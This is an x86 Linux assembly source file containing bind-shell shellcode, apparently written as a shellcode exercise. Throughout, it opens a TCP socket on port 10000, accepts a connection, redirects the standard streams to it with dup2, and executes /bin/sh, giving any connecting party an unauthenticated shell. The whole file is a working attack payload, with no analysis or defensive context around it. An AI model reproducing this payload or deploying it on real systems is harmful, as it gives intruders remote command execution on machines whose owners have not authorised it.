global _start

section .text
_start:

xor ecx,ecx
mul ecx
xor ebx,ebx 
;socket(AF_INET, SOCK_STREAM, 0)
; eax     ebx       ecx      edx
Socket:
mov ax,359 ; socket system call
mov bl, 2 ;  AF_INET
mov cl, 1 ;   SOCK_STREAM
int 0x80

;int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
;    eax      ebx                            ecx            edx
Bind:
mov bl,al           ; move socket value in bl
xor ecx,ecx
mul ecx

mov ax,361          ; bind system call
push ecx            ; padding
push ecx            ; padding
push ecx            ; INADDR_ANY
push word 0x1027         ; port number htons(10000)
push word 2         ; sa_family
mov ecx, esp        ; moved sockaddr address to ecx
mov dl, 16          ; addrlen
int 0x80    

;int listen(int sockfd, int backlog);
;     eax        ebx         ecx
Listen:
xor ecx,ecx
mul ecx
mov ax,363          ; listen system call
mov cl,10           ; The backlog argument defines the maximum length 
                    ; to which the queue of pending connections for sockfd may grow.
int 0x80

;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
;     eax       ebx                      ecx              edx
Accept:
xor ecx,ecx
mul ecx
mov al,102          ; socketcall system call
push ecx            ;  pushed NULL
push ecx            ;  Pushed Null
push ebx            ;  sockfd
mov ecx, esp    
mov bl, 5           ;  Calling accept(sockfd, NULL, NULL)
int 0x80
mov ebx, eax

;int dup2(int oldfd, int newfd);
;    eax      ebx        ecx
CopyDescriptors:
xor ecx,ecx
mul ecx

mov al, 63
int 0x80


;int dup2(int oldfd, int newfd);
;    eax      ebx        ecx
xor ecx,ecx
mul ecx

mov al, 63
mov cl, 1
int 0x80

;int dup2(int oldfd, int newfd);
;    eax      ebx         ecx
xor ecx,ecx
mul ecx

mov al, 63
mov cl, 2
int 0x80

;execve("/bin/sh")
Execve:
xor eax,eax
push eax
mov al,11 ; execve system call
push 0x68732f2f ;hs//
push 0x6e69622f ;nib/
mov ebx, esp
xor ecx,ecx
push ecx
push ebx
mov ecx, esp
xor edx,edx
int 0x80

